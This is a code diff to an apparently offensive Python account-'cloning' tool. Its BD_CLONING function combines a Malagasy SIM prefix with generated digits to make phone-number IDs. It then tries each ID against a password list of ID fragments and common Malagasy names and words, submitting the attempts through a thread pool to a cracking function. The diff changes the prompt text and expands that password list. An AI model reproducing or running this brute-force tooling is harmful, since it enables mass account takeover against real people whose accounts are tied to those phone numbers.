@@ -95,8 +95,7 @@ def MR_ITACHI():
 def BD_CLONING():
     user=[]
     clear()
-    print(' CODE SIM MALAGASY : [+26132] [+26134] [+26138] [+26133]')
-    print(' 261=0 Madagascar : [032] [034] [038] [033]')
+    print('  CODE SIM MALAGASY : [032] [034] [038] [033]')
     code=input(' ENTER SIM CODE >> ')
     linex()
     print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
@@ -116,7 +115,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],'nekena','Nekena','fitiavana','Fitiavana','miangola','nomena','amboara','Nomena','Amboara','lahatra','Lahatra','faniry','Faniry','fitahina','Fitahina','tafita','Tafita','Miangola','fiderana','Fiderana','miangaly','Miangaly','nilaina','Nilaina','mahery','Mahery','nirina','Nirina','lafatra','Lafatra','fandresena','Fandresena','fanantenana','Fanantenana','mamako','Mamako','anjara','Anjara','malala','Malala','safidy','Safidy','vadiko','Vadiko','mahefa','Mahefa','randria','Randria','faneva','Faneva','solofo','Solofo','ravaka','Ravaka','sarindra','narindra','fanomezana','fiderana','Fiderana','fandresena','Fandresena','nantenaina','Nantenaina','Rakotomalala','rakotomalala','fahendrena','Fahendrena','finoana','Finoana','Fanomezana','valisoa','Valisoa','malalako','Malalako','narovana','Narovana','mamiko','Mamiko','tantely','Tantely','tolotra','Tolotra']
+            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],'nekena','tahiry','Nekena','fitiavana','narovana','Fitiavana','nantenaina','miangola','nomena','amboara','Nomena','Amboara','lahatra','Nantenaina','Lahatra','nirina','Faniry','fitahina','Narovana','Fitahina','tafita','Tahiry','Tafita','Miangola','fiderana','nilaina','miangaly','Miangaly','Fiderana','Nilaina','mahery','Mahery','Faniry','Nirina','lafatra','Lafatra','fandresena','Fandresena','fanantenana','Fanantenana','mamako','Mamako','anjara','Anjara','malala','Malala','safidy','Safidy','vadiko','Vadiko','mahefa','Mahefa','randria','Randria','faneva','Faneva','solofo','Solofo','ravaka','Ravaka','sarindra','narindra','fanomezana','fiderana','Fiderana','fandresena','Fandresena','Rakotomalala','rakotomalala','fahendrena','Fahendrena','finoana','Finoana','Fanomezana','valisoa','Valisoa','malalako','Malalako','mamiko','Mamiko','tantely','Tantely','tolotra','Tolotra']
             Dipto.submit(method_crack,ids,passlist)
     linex() 
     print(' LE CLONING EST FINI ')
